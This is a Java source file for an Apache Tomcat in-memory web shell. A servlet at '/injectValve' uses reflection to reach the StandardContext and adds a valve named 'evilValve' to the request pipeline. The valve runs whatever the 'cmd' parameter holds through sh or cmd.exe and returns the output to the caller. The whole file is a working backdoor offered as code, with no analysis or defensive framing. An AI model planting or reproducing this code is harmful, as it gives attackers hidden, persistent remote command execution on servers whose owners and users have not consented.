package com;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardPipeline;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

@WebServlet("/injectValve")
public class InjectValve extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            ServletContext servletContext = req.getServletContext();

            java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
            //获取ApplicationContext中的StandardContext
            contextField = applicationContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);

            StandardPipeline pipeline = (StandardPipeline) standardContext.getPipeline();

            ValveBase evilValve = new ValveBase() {
                @Override
                public void invoke(Request request, Response response) throws ServletException,IOException {
                    if (request.getParameter("cmd") != null) {
                        boolean isLinux = true;
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
                        String output = s.hasNext() ? s.next() : "";
                        response.setCharacterEncoding("GBK");
                        PrintWriter out = response.getWriter();
                        out.println(output);
                        out.flush();
                        out.close();
                        this.getNext().invoke(request, response);
                    }
                }
            };

            pipeline.addValve(evilValve);
            System.out.println("inject valve success");

        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
